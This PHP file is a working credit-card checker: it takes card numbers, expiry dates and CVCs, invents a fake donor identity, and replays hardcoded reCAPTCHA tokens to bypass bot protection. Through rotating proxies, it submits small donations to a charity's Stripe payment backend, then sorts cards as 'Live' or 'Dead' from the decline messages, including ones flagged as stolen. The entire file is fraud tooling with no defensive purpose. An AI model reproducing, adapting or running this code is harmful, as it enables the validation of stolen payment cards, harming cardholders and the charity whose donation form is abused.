<?php

error_reporting(0);
header("Content-Type: application/json");
$proxies = load_proxies("proxies.txt");

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (
        isset($_POST["ccn"]) &&
        isset($_POST["month"]) &&
        isset($_POST["year"]) &&
        isset($_POST["cvc"])
    ) {
        $ccn = $_POST["ccn"];
        $month = $_POST["month"];
        $year = $_POST["year"];
        $cvc = $_POST["cvc"];

        if (empty($proxies)) {
            http_response_code(500);
            echo json_encode(["error" => "No proxies available"]);
        } else {
            process_card($ccn, $month, $year, $cvc, $proxies);
        }
    } else {
        http_response_code(400);
        echo json_encode([
            "error" => "Missing one or more required data fields",
        ]);
    }
} else {
    http_response_code(405);
    echo json_encode(["error" => "Only POST requests are allowed"]);
}

function get_random_user()
{
    try {
        $response = file_get_contents("https://randomuser.me/api/?nat=us");

        if ($response === false) {
            throw new Exception("Failed to fetch random data from API.");
        }

        $json_data = json_decode($response, true);
        $user_info = isset($json_data["results"]) ? $json_data["results"] : [];

        if (!empty($user_info)) {
            $user_info = $user_info[0];
            $first_name = $user_info["name"]["first"];
            $last_name = $user_info["name"]["last"];
            $email = $first_name . "." . $last_name . "@yahoo.com";

            if ($first_name || $last_name || $email) {
                return [$first_name, $last_name, $email];
            }
        }

        return null;
    } catch (Exception $e) {
        http_response_code(500);
        return json_encode(["error" => $e->getMessage()]);
    }
}

function load_proxies($filename)
{
    $proxies = [];
    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        $proxyParts = explode(":", $line);
        if (count($proxyParts) === 2) {
            $ip = trim($proxyParts[0]);
            $port = trim($proxyParts[1]);
            $proxies[] = $ip . ":" . $port;
        }
    }

    return $proxies;
}

function get_stripe_data()
{
    $api_url = "https://m.stripe.com/6";

    try {
        $opts = [
            "http" => [
                "method" => "POST",
                "request_fulluri" => true,
            ],
        ];

        $context = stream_context_create($opts);
        $response = file_get_contents($api_url, false, $context);

        if ($response === false) {
            throw new Exception("Failed to fetch stripe data");
        }

        $json_data = json_decode($response, true);
        $muid = isset($json_data["muid"]) ? $json_data["muid"] : null;
        $guid = isset($json_data["guid"]) ? $json_data["guid"] : null;
        $sid = isset($json_data["sid"]) ? $json_data["sid"] : null;

        if ($muid && $guid && $sid) {
            return [$muid, $guid, $sid];
        }
    } catch (Exception $e) {
        http_response_code(500);
        return json_encode(["error" => $e->getMessage()]);
    }
}

function bypass_captcha()
{
    try {
        $request = file_get_contents(
            "https://www.google.com/recaptcha/api2/anchor?ar=2&k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa&co=aHR0cHM6Ly9kb25hdGUuZ2l2ZWRpcmVjdGx5Lm9yZzo0NDM.&hl=en&v=pCoGBhjs9s8EhFOHJFe8cqis&size=invisible&cb=wtef4lvtnlmf"
        );
        $pattern = '/type="hidden" id="recaptcha-token" value="(.*?)"/';
        $token = "";
        if (preg_match($pattern, $request, $matches)) {
            if (isset($matches[1])) {
                $token = $matches[1];
            }
        }
        if ($token !== null) {
            $headers = [
                "accept: */*",
                "accept-encoding: gzip, deflate, br",
                "accept-language: fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
                "content-type: application/x-www-form-urlencoded",
                "origin: https://www.google.com",
                "user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
                "pragma: no-cache",
                "sec-fetch-dest: empty",
                "sec-fetch-mode: cors",
                "sec-fetch-site: same-origin",
                "referer: https://www.google.com/recaptcha/api2/anchor?ar=2&k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa&co=aHR0cHM6Ly9kb25hdGUuZ2l2ZWRpcmVjdGx5Lm9yZzo0NDM.&hl=en&v=pCoGBhjs9s8EhFOHJFe8cqis&size=invisible&cb=wtef4lvtnlmf",
            ];
            $data = [
                "v" => "pCoGBhjs9s8EhFOHJFe8cqis",
                "k" => "6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa",
                "reason" => "q",
                "c" => $token,
                "co" => "aHR0cHM6Ly9kb25hdGUuZ2l2ZWRpcmVjdGx5Lm9yZzo0NDM.",
                "hl" => "en",
                "size" => "invisible",
                "chr" => "%5B79%2C17%2C39%5D",
                "vh" => "19287791902",
                "bg" =>
                    "3tig2N0KAAQVCIdpbQEHnAbQ-_ld0wKQtuUGdgz48tMdDG6Y37QSVQk6saWxLfzmLQ5n-wnTHIukPYy-zt1XevEoVPWoFpnmZ-i6-qXpwbOeWrOSuEY12k7KPqJIuX43u3MNY6yz34uOcOcUKo2TbasUbkdS-PbYSN3A64RjZORV6JhpMdgZE0NOh8m5ssYkkefHJVLzzzyC2qZrMw5E3bWfbwqQAwY5vyzhqPHDO649RbxxsuLnfFTmXhL2xRZREFtasghBUoP9XF5aUw8IlGtYcDsxqPFcpw8-Jl_34aZeS40Ot830hrxvjGjVFnraz0iKuvN4V65CA_CLyzprxBVXttv-KhKVsspHMhEJ5npvyhmsEkLJA_DYP1eyU1tDcPMcjhbN_WFLgkvfiXC995iE-pi2GdaWHgY7-3VP19CR_gNCyUZ2FAn9UFf4z6vkDe9hkiC3kXLWsjrVEiwV79DDDaHSIQ9dKaNOVzckZhX4A-YeYPfBiZSQ22y7Lwmsyw3xkt1rqF5gL_eFUNXQfbi4u18ZvkFkixLnUvnpG-ZG1WuzEFb34NchNmb-3pWIrjpnV4ANlhsYTkSZiGwzdXiaVKoklBuBL01666y0H7Ie7A9oMHYyWmn1oMrt0_pEWRwr8BPQVNEULIqe0QGa6u6JMrPZ8IIKpBa4LSPRxempn2kSX1QaFqqsNrQUr6a4RiM4-RxPg4ZJwdfuIxDYNY5ywFIRrUHFxz_VN7bmH9ipbdAINBL7J9l1xvh369GFYUpMw1uL8hhanqHqNPq58s73U8DOtLclMtHiQcgfizvVCkljGY3Db1OSxjQ5ySy_amva91ms4LwBWTJlcWKDOlDXiKWtGYYJrxj78Z5KNRodG05EJHgBBmYQU2nxA6RAVWC2Z7hzIIZ01NYvDrcDfrtag7a2qpy4RVQI5QlB6hhJrzek4uZSxcwV-xWKcvvmKjOyExcTJ-zNrJ5h-oVUgonI7PFd4GPD04yHJM6ifivohRVJOVtBHbYh1l2sdG4wnNdQrqgJta9aR8PMVmzB93ZxN5sJGZmNQJ1OLsOonYHd80YR3Bu8OzeweoMOmhIrk-j5_bMI483_l-roGZR8uDoekYl_1sJwwyQnhhgyBLqGw-xERL1oQrLw7Ls_Q3cgCAuZwVKr32fa1SlJYjWGPnX7TE72X82P9bCCHr2yNTJSzGFlPYUsk5tnEDxqw_fW27ZOu4zLdiyuAY1fpMHyx6-W9_9TY9jKtYn6pC5VnIZeZO_SG-NjDj2SsdgITHHOWfrM43cnECYuUVdKD_6H3OUoNTXfnkjzQ54kNxTmtbW1Iq4FNWFYPyi6MCpZU1mGusylxvrCJQdsG7oy3bSSRq47LTPwC3NFjE7twA9r-NOdQj7XOqNyAWLz_ebp7Dsp_r6Bkk9cPn0fBkNJw9tUFPOhchSPFFUO8yzteBviuwhVKQVC2RsTfPYF4SZg0snpmoVWqr2xYyakB9KLNZO_Rjroyr5o9_K2oYcAkqKVoWTQF3VvQn9X3QcR82F6qVomyLly4b3HJcX32cojip8ubD-xycaYKjWjFrynyCDRGl7rJTlmpIBoi098iGFUNwVBrbgbpjaaOsx-LA490Nl-OFf8JF0cWWcBd_MWlJeVsyGamzXMQMO8rJ9EbYwWhDwAJ3VEupsVgPG-EOefqN9AUP9m-IAhvVi4JWchxhr4i2fN-mils-F5zPzMQT9igGj3VOYcAjp500IdikQViZ1Xfg6aVH1nIuXbeZdTLgFQq3y3RJR1Fb23KoXMJkqBnAowzy5bctoNGpSLcCrDXxuX5g9G3OKYpr54rtvYdxyi80rOSUdRyJA_dszrbw2t-h2KVtvhAxu3Zp7A73eo0EPMVvL2uynAEaX0l4NrqeIgwwMKadjxRcvJ-u6eTqNUUTAGyGtuzaK04sJpuJ3ZzZ_NCzcVpYDarNHngydlsYJzfJreVWfat-Ebjg-ofUAJhi4xq2h18PArHDcSjrqzZUtGyGaKLAVaK2pAGJRz6zgSVSHdFpssKzvltHfriqN61WKVruAVFjfC4kWM4hlaC_IE7AjztE7Vf3R8xtKts2jYbN6YLQsiLsW1t7_q-ewQJjNbyDKF1AC-c7v3t2r9-dHzvi_hroHsZO9_MlAYJNfxOMq3oKVXJnMl8O415yU7OwhNenIXyRYfoktTL5LKYY6uk1HX2Dt6wuOGvhoWnrpUpJtSIz7l532yiQqOtLgYS3EtE2h2Yh0IK3qGk4zxfpxqROyYhcRKCzMwuFYkFJ7gtl5jVsk8IwnrJ7RpiaAqyOWxvsURMfv3KjzWGd2kLhKR7TYL8qLCwlv5PNgyqd9LTYDK4g",
            ];

            $url =
                "https://www.google.com/recaptcha/api2/reload?k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa";
            $opts = [
                "http" => [
                    "method" => "POST",
                    "header" => $headers,
                    "content" => http_build_query($data),
                ],
            ];

            $context = stream_context_create($opts);
            $response = file_get_contents($url, false, $context);

            if ($response !== false) {
                $pattern = '/\["rresp","(.*?)"/';
                if (preg_match($pattern, $response, $matches)) {
                    if (isset($matches[1])) {
                        return $matches[1];
                    }
                }
            }
        }

        throw new Exception("Failed to get captcha token");
    } catch (Exception $e) {
        http_response_code(500);
        return json_encode(["error" => $e->getMessage()]);
    }
}

function get_card_info($ccn)
{
    try {
        $url = "https://lookup.binlist.net/" . $ccn;
        $headers = [
            "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        ];

        $opts = [
            "http" => [
                "method" => "GET",
                "header" => $headers,
            ],
        ];

        $context = stream_context_create($opts);
        $response = file_get_contents($url, false, $context);

        if ($response !== false) {
            $data = json_decode($response, true);

            if (
                isset($data["bank"]["name"]) &&
                isset($data["country"]["alpha2"]) &&
                isset($data["type"]) &&
                isset($data["scheme"])
            ) {
                $bank = $data["bank"]["name"];
                $country = $data["country"]["alpha2"];
                $card_type = ucfirst($data["type"]);
                $brand = ucfirst($data["scheme"]);

                $cardInfo = [
                    "bank" => $bank,
                    "country" => $country,
                    "type" => $card_type,
                    "brand" => $brand,
                ];

                $cardInfoObject = json_decode(json_encode($cardInfo));
                return $cardInfoObject;
            }
        }

        throw new Exception("Failed to get card information");
    } catch (Exception $e) {
        http_response_code(500);
        return json_encode(["error" => $e->getMessage()]);
    }
}

function process_card($ccn, $month, $year, $cvc, $proxies)
{
    try {
        list($first_name, $last_name, $email) = get_random_user();
        list($muid, $guid, $sid) = get_stripe_data();

        if (
            $first_name !== null ||
            $last_name !== null ||
            $email !== null ||
            $muid !== null ||
            $guid !== null ||
            $sid !== null
        ) {
            $headers = [
                "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
                "content-type: application/json",
            ];

            $payload = [
                "cents" => 999,
                "frequency" => "once",
                "directDonationTo" => "unrestricted",
                "emailAddress" => $email,
                "firstName" => $first_name,
                "lastName" => $last_name,
                "recaptchaResponse" => bypass_captcha(),
                "subscribeToEmailList" => true,
            ];

            $context = stream_context_create([
                "http" => [
                    "method" => "POST",
                    "header" => $headers,
                    "content" => json_encode($payload),
                    "proxy" => "tcp://" . $proxies[array_rand($proxies)],
                    "timeout" => 10,
                ],
            ]);

            $payment_req = file_get_contents(
                "https://www-backend.givedirectly.org/payment-intent",
                false,
                $context
            );

            if ($payment_req == false) {
                throw new Exception("Failed to retrieve payment intent or rate limited");
            }

            $payment_data = json_decode($payment_req, true);
            if ($payment_data && json_last_error() !== JSON_ERROR_NONE) {
                throw new Exception(json_last_error_msg());
            }

            $client_secret = $payment_data["clientSecret"];
            $payment_intent = $payment_data["paymentIntent"];

            $payment_data = [
                "payment_method_data[type]" => "card",
                "payment_method_data[billing_details][name]" =>
                    $first_name . " " . $last_name,
                "payment_method_data[card][number]" => $ccn,
                "payment_method_data[card][cvc]" => $cvc,
                "payment_method_data[card][exp_month]" => $month,
                "payment_method_data[card][exp_year]" => $year,
                "payment_method_data[guid]" => $guid,
                "payment_method_data[muid]" => $muid,
                "payment_method_data[sid]" => $sid,
                "payment_method_data[pasted_fields]" => "number",
                "payment_method_data[payment_user_agent]" =>
                    "stripe.js/09e54426b4; stripe-js-v3/09e54426b4;card-element",
                "payment_method_data[time_on_page]" => "40265",
                "expected_payment_method_type" => "card",
                "use_stripe_sdk" => "true",
                "client_secret" => $client_secret,
            ];

            $stripeSecretKey = "pk_live_B3imPhpDAew8RzuhaKclN4Kd";
            $context = stream_context_create([
                "http" => [
                    "method" => "POST",
                    "header" => [
                        "Content-Type: application/x-www-form-urlencoded",
                        "Authorization: Basic " .
                        base64_encode($stripeSecretKey . ":"),
                    ],
                    "content" => http_build_query($payment_data),
                    "proxy" => "tcp://" . $proxies[array_rand($proxies)],
                    "timeout" => 10,
                ],
            ]);

            $response = file_get_contents(
                "https://api.stripe.com/v1/payment_intents/" .
                    $payment_intent .
                    "/confirm",
                false,
                $context
            );

            if ($response === false) {
                throw new Exception("Stripe payment gateway failed or rate limited");
            }

            $conditions = [
                "cvc_check: pass" => [
                    "status" => "Live",
                    "message" => "CVV Matched",
                ],
                "succeeded" => [
                    "status" => "Live",
                    "message" => "CVV Matched",
                ],
                "requires_payment_method" => [
                    "status" => "Live",
                    "message" => "CVV Matched",
                ],
                "authentication" => [
                    "status" => "Live",
                    "message" => "CVV Matched",
                ],
                "Thank You For Donation." => [
                    "status" => "Live",
                    "message" => "CVV Matched",
                ],
                'type: "one-time"' => [
                    "status" => "Live",
                    "message" => "CVV Matched",
                ],
                "security code is incorrect." => [
                    "status" => "Live",
                    "message" => "CCN Matched",
                ],
                "Your card's security code is incorrect." => [
                    "status" => "Live",
                    "message" => "CCN Matched",
                ],
                "incorrect_cvc" => [
                    "status" => "Live",
                    "message" => "CCN Matched",
                ],
                "stolen_card" => [
                    "status" => "Live",
                    "message" => "Stolen Card",
                ],
                "lost_card" => [
                    "status" => "Live",
                    "message" => "Lost Card",
                ],
                "Your card has insufficient funds." => [
                    "status" => "Live",
                    "message" => "Insufficient Funds",
                ],
                "pickup_card" => [
                    "status" => "Dead",
                    "message" => "Pickup Card",
                ],
                "insufficient_funds" => [
                    "status" => "Dead",
                    "message" => "Insufficient Funds",
                ],
                "Your card has expired." => [
                    "status" => "Dead",
                    "message" => "Card Expired",
                ],
                "Your card number is incorrect." => [
                    "status" => "Dead",
                    "message" => "Incorrect credit card number",
                ],
                "Your card was declined." => [
                    "status" => "Dead",
                    "message" => "Card declined",
                ],
                "reenter" => ["status" => "Dead", "message" => "Re-enter"],
                "do_not_honor" => [
                    "status" => "Dead",
                    "message" => "Do not honor",
                ],
                "transaction_not_allowed" => [
                    "status" => "Dead",
                    "message" => "Transaction not allowed",
                ],
                "generic_decline" => [
                    "status" => "Dead",
                    "message" => "Generic decline",
                ],
                "Your card's security code is invalid." => [
                    "status" => "Dead",
                    "message" => "Invalid security code",
                ],
                "invalid_cvc" => [
                    "status" => "Dead",
                    "message" => "Invalid CVC",
                ],
                "card_not_supported" => [
                    "status" => "Dead",
                    "message" => "Card not supported",
                ],
                "expired_card" => [
                    "status" => "Dead",
                    "message" => "Expired card",
                ],
                "card_declined" => [
                    "status" => "Dead",
                    "message" => "Card declined",
                ],
                "call_issuer" => [
                    "status" => "Dead",
                    "message" => "Call issuer",
                ],
                "Your card's security code is not correct." => [
                    "status" => "Dead",
                    "message" => "Incorrect security code",
                ],
                "currency_not_supported" => [
                    "status" => "Dead",
                    "message" => "Currency not supported",
                ],
                "Try Again Later" => [
                    "status" => "Dead",
                    "message" => "Try again later",
                ],
            ];

            $result = null;
            foreach ($conditions as $condition => $msg) {
                if (strpos($response, $condition) !== false) {
                    if ($msg["status"] == "Live") {
                        $result = [$msg, get_card_info($ccn)];
                    } else {
                        $result = $msg;
                    }
                    break;
                }
            }
            if ($result !== null) {
                echo json_encode($result);
            } else {
                echo json_encode(["status" => "Unknown"]);
            }
        }
    } catch (Exception $e) {
        http_response_code(500);
        echo json_encode(["error" => $e->getMessage()]);
    }
}

?>
